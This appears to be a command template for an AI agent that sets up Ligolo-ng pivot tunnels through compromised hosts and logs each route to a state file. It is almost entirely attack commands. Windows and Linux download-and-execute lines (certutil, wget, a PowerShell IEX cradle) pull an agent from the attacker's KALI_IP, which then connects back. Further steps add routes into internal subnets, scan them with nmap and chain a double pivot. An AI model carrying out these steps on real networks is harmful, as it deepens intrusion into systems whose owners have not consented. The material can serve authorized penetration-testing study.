Set up a Ligolo-ng tunnel for a new subnet or compromised host. $ARGUMENTS = new subnet CIDR and/or compromised host OS (windows/linux). Update ~/osai/state/tunnel_map.md with the new route.

## Ligolo-ng architecture
- Kali runs the **proxy** (relay) — acts as the Ligolo server
- Compromised host runs the **agent** — connects back to Kali
- After agent connects: select session in Ligolo console → start → add ip route on Kali
- No proxychains needed — all tools work natively via the tun0/ligolo interface

## Step 1: Kali relay (start once, keep running in tmux)
```bash
# Start proxy with self-signed cert
sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Or if already running — add new listener for double pivot:
# In Ligolo console on first session:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11602
```

## Step 2: Deploy agent on compromised host

**Windows:**
```powershell
# Download and run (from Kali HTTP server)
certutil -urlcache -split -f http://KALI_IP:8000/ligolo-agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect KALI_IP:11601 -ignore-cert

# PowerShell alternative
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP:8000/run-agent.ps1')

# If no egress on 11601, try 443 or 80:
agent.exe -connect KALI_IP:443 -ignore-cert
```

**Linux:**
```bash
wget http://KALI_IP:8000/ligolo-agent -O /tmp/agent && chmod +x /tmp/agent
/tmp/agent -connect KALI_IP:11601 -ignore-cert &
```

## Step 3: Activate tunnel in Ligolo console
```
ligolo-ng >> session          # select the new agent
ligolo-ng >> start            # activate tunnel (tun0 / ligolo interface)
```

## Step 4: Add routes on Kali for each reachable subnet
```bash
# First pivot (internal network behind DMZ host)
sudo ip route add 10.10.10.0/24 dev ligolo

# Second pivot subnet (behind internal host)
sudo ip route add 172.16.50.0/24 dev ligolo

# Add the NEW subnet from $ARGUMENTS:
sudo ip route add <NEW_SUBNET> dev ligolo

# Verify
ip route | grep ligolo
```

## Step 5: Verify tunnel works
```bash
# Ping test through tunnel
ping -c 2 <INTERNAL_IP>

# Port test
nmap -sn <NEW_SUBNET>
```

## Step 6: Update tunnel map
Append to ~/osai/state/tunnel_map.md:
```markdown
| Pivot Host | Agent OS | New Subnet | Route Added | Time |
|------------|----------|------------|-------------|------|
| <HOST> | <Windows/Linux> | <SUBNET> | sudo ip route add <SUBNET> dev ligolo | <TIME> |
```

## Step 7: Generate payloads for next hop (double pivot)
If this agent needs to pivot further:
```bash
# In Ligolo console on THIS session:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11602

# New agent on deeper host connects to THIS pivot host:
agent.exe -connect <PIVOT_HOST_IP>:11601 -ignore-cert

# On Kali: proxy listens on 11602 for second pivot
# Add tun1 routes for second-level subnets
```

## Verification checklist
- [ ] `ip route | grep ligolo` shows the new subnet
- [ ] Can ping an internal IP through the tunnel
- [ ] nmap works against internal hosts without proxychains
- [ ] tunnel_map.md updated
